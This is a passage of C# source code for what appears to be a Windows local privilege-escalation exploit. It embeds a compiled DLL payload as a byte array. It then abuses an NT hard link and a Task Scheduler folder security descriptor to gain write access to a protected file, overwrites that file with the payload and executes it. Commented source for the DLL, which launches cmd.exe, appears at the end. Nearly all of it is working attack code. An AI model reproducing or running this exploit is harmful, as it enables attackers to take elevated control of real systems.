0x4C, 0x50, 0x43, 0x5F, 0x44, 0x6C, 0x6C, 0x2E, 0x70, 0x64, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22, 0x2A, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5F, 0x43, 0x6F, 0x72, 0x44, 0x6C, 0x6C, 0x4D, 0x61, 0x69, 0x6E, 0x00, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x65, 0x65, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x25, 0x00, 0x20, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x58, 0x40, 0x00, 0x00, 0x1C, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1C, 0x03, 0x34, 0x00, 0x00, 0x00, 0x56, 0x00, 0x53, 0x00, 0x5F, 0x00, 0x56, 0x00, 0x45, 0x00, 0x52, 0x00, 0x53, 0x00, 0x49, 0x00, 0x4F, 0x00, 0x4E, 0x00, 0x5F, 0x00, 0x49, 0x00, 0x4E, 0x00, 0x46, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBD, 0x04, 0xEF, 0xFE, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x01, 0x00, 0x56, 0x00, 0x61, 0x00, 0x72, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x04, 0x00, 0x00, 0x00, 0x54, 0x00, 0x72, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x04, 0x7C, 0x02, 0x00, 0x00, 0x01, 0x00, 0x53, 0x00, 0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00, 0x58, 0x02, 0x00, 0x00, 0x01, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x34, 0x00, 0x62, 0x00, 0x30, 0x00, 0x00, 0x00, 0x1A, 0x00, 0x01, 0x00, 0x01, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22, 0x00, 0x01, 0x00, 0x01, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x79, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3A, 0x00, 0x09, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x44, 0x00, 0x65, 0x00, 0x73, 0x00, 0x63, 0x00, 0x72, 0x00, 0x69, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x00, 0x4C, 0x00, 0x50, 0x00, 0x43, 0x00, 0x5F, 0x00, 0x44, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x08, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00, 0x3A, 0x00, 0x0D, 0x00, 0x01, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x41, 0x00, 0x4C, 0x00, 0x50, 0x00, 0x43, 0x00, 0x5F, 0x00, 0x44, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x12, 0x00, 0x01, 0x00, 0x4C, 0x00, 0x65, 0x00, 0x67, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x00, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x20, 0x00, 0xA9, 0x00, 0x20, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x31, 0x00, 0x38, 0x00, 0x00, 0x00, 0x2A, 0x00, 0x01, 0x00, 0x01, 0x00, 0x4C, 0x00, 0x65, 0x00, 0x67, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x54, 0x00, 0x72, 0x00, 0x61, 0x00, 0x64, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x72, 0x00, 0x6B, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42, 0x00, 0x0D, 0x00, 0x01, 0x00, 0x4F, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x41, 0x00, 0x4C, 0x00, 0x50, 0x00, 0x43, 0x00, 0x5F, 0x00, 0x44, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x00, 0x09, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x00, 0x4C, 0x00, 0x50, 0x00, 0x43, 0x00, 0x5F, 0x00, 0x44, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x08, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00, 0x38, 0x00, 0x08, 0x00, 0x01, 0x00, 0x41, 0x00, 0x73, 0x00, 0x73, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x62, 0x00, 0x6C, 0x00, 0x79, 0x00, 0x20, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x34, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, };
            // dacl to use
            string dacl = "D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)";

            /* native link not working
            bool created = CreateHardLink(taskFolder, destfile, IntPtr.Zero);
            if (!created)
            {
                Console.WriteLine("Failed generating hardLink");
                return;
            }*/

            bool created = HardLink.CreateNtHardLink(taskFolder, destfile);
            if (!created)
            {
                Console.WriteLine("Failed generating hardLink");
                return;
            }

            Console.WriteLine("HardLink created meeh : {0} -> {1}", taskFolder, destfile);

            try
            {
                /*
                // COM dynamic
                Type scheduleService = Type.GetTypeFromProgID("Schedule.Service");
                //Type scheduleService = Type.GetTypeFromCLSID(new Guid("2FABA4C7-4DA9-4013-9697-20CC3FD40F85"));
                dynamic scheServiceInst = Activator.CreateInstance("Taskschd","");
                scheServiceInst.Connect();
                var folder = scheServiceInst.GetFolder("\\");
                folder.CreateFolder(taskFolderJob);
                folder.SetSecurityDescriptor(dacl, 0);*/

                using (TaskService ts = new TaskService())
                {
                    //RawSecurityDescriptor sd = new RawSecurityDescriptor(dacl);
                    //TaskSecurity tSec = new TaskSecurity();
                    //tSec.SetSecurityDescriptorSddlForm(dacl);
                    ts.RootFolder.DeleteFolder(taskFolderJob, false);
                    //TaskFolder fold = ts.RootFolder.CreateFolder(taskFolderJob, dacl,false);
                    TaskFolder fold = ts.RootFolder.CreateFolder(taskFolderJob);
                    fold.SetSecurityDescriptorSddlForm(dacl, TaskSetSecurityOptions.None);
                    Console.WriteLine("created task folder with ssdl shipped to {0} ", destfile);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("create task folder with ssdl failed " + ex.Message);
                return;
            }

            Console.WriteLine("Copying bytes onto {0}", destfile);
            if (File.Exists(destfile))
            {                
                try
                {
                    File.WriteAllBytes(destfile, ciemmedi);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Exception on copy payload on {0} {1}", destfile, ex.Message);
                    return;
                }
            }
            else
            {
                Console.WriteLine("Cant copy payload on {0} ", destfile);
                return;
            }

            Console.WriteLine("Triggering payload {0}", destfile);

            Assembly assembly = Assembly.LoadFile(destfile);
            Type type = assembly.GetType("Ciemmedi.cmd");
            MethodInfo methodInfo = type.GetMethod("Go");
            if (type != null)
            {
                methodInfo = type.GetMethod("Go");
            }
            if (methodInfo != null)
            {
                methodInfo.Invoke(null, null);
            }

        }
    }
}



/*
DLL source code below
*/

/*
using System;
using System.Diagnostics;

namespace Ciemmedi
{
    public class cmd
    {
        public static void Go()
        {
            //* Create your Process
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            //* Set your output and error (asynchronous) handlers
            process.OutputDataReceived += new DataReceivedEventHandler(OutputHandler);
            process.ErrorDataReceived += new DataReceivedEventHandler(OutputHandler);
            //* Start process and handlers
            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
            process.WaitForExit();
        }

        static void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            Console.WriteLine(outLine.Data);
        }
    }
}
*/